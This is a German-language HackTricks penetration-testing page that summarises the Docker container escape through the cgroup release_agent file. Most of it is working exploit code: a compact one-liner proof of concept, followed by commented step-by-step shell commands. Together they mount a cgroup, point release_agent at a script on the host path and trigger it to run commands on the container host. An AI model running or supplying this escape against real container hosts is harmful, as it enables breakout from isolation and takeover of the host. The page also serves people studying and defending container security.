# Docker release\_agent cgroups escape

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}


**Für weitere Details, siehe den** [**originalen Blogbeitrag**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dies ist nur eine Zusammenfassung:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Der Proof of Concept (PoC) demonstriert eine Methode, um cgroups auszunutzen, indem eine `release_agent`-Datei erstellt und deren Aufruf ausgelöst wird, um beliebige Befehle auf dem Container-Host auszuführen. Hier ist eine Aufschlüsselung der beteiligten Schritte:

1. **Umgebung vorbereiten:**
* Ein Verzeichnis `/tmp/cgrp` wird erstellt, um als Mount-Punkt für die cgroup zu dienen.
* Der RDMA cgroup-Controller wird in dieses Verzeichnis gemountet. Im Falle des Fehlens des RDMA-Controllers wird empfohlen, den `memory` cgroup-Controller als Alternative zu verwenden.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Richten Sie die Kind-Cgroup ein:**
* Eine Kind-Cgroup mit dem Namen "x" wird im gemounteten Cgroup-Verzeichnis erstellt.
* Benachrichtigungen sind für die "x" Cgroup aktiviert, indem 1 in die Datei notify\_on\_release geschrieben wird.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Release-Agent konfigurieren:**
* Der Pfad des Containers auf dem Host wird aus der Datei /etc/mtab abgerufen.
* Die release\_agent-Datei der cgroup wird dann so konfiguriert, dass sie ein Skript mit dem Namen /cmd ausführt, das sich am ermittelten Host-Pfad befindet.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Erstellen und Konfigurieren des /cmd-Skripts:**
* Das /cmd-Skript wird innerhalb des Containers erstellt und so konfiguriert, dass es ps aux ausführt und die Ausgabe in eine Datei namens /output im Container umleitet. Der vollständige Pfad von /output auf dem Host wird angegeben.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Trigger den Angriff:**
* Ein Prozess wird innerhalb der "x" Kind-Cgroup gestartet und sofort beendet.
* Dies löst den `release_agent` (das /cmd-Skript) aus, der ps aux auf dem Host ausführt und die Ausgabe in /output innerhalb des Containers schreibt.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
